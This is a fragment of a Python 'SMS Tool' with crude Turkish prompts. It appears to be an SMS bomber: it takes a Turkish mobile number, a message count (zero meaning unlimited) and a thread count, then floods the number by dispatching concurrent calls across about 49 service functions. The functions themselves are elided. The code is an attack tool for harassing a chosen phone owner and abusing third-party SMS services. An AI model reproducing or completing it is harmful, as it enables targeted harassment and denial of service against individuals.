...
os.system("clear")
os.system("figlet toprakkemalSmSTool")
try:
    import requests, urllib3, uuid
except ImportError:
    print("BabaproSigmatoollarindiriliyor...")
    ...
    if amount == 0:
        ...
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % 49])
    print("\nGönderim tamamlandı AQ!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi Aq. {success_sends} başarılı, {failed_sends} başarısız.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()
...
def watermark():
    print("SMS Tool by coder toprakka ")

def get_number():
    global clear
    while True:
        try:
            number = int(input(f"""Tel numarasını yazın. Şu gibi: "54xxxxxxxx" (Sadece Türk numaralarinda calusio aq n!)\n[?] : """))
            if len(str(number)) == 10 and str(number)[0] == "5":
                return number
            else:
                clear()
                print(f"Yanlış numara girdin yarram.")
        except:
            clear()
            print(f"numara yazla yarram.")

def get_amount():
    global clear
    while True:
        try:
            amount = int(input(f"""Kaç SMS gönderilsin? Sınırsız gönderim için "0" bas yarram n.\n[?] : """))
            if amount >= 0:
                return amount
            else:
                clear()
                print(f"Girilen sayı 0'dan küçük olmazla ywrram.")
        except:
            clear()
            print(f"sayi gir la yarram bir sayı girin.")

def get_worker_amount():
    global clear
    while True:
        try:
            worker_amount = int(input(f"Thread sayısını gir yarram. Tavsiye edilen 5-100 arasıdır (40 girmeni oneririm yarram).\n[?] : "))
            if worker_amount >= 1:
                return worker_amount
            else:
                clear()
                print(f"Girilen sayı 1'den küçük olamaz yarrwm.")
        except:
            clear()
            print(f"Lütfen bir sayı gir yarram.")

def restart():
    global clear
    while True:
        question = input(f"babaprosigma sms tooldan çıkılsın mı\n[Y/N] : ").upper().replace(" ", "")
        if question == "Y":
            quit()
        elif question == "N":
            clear()
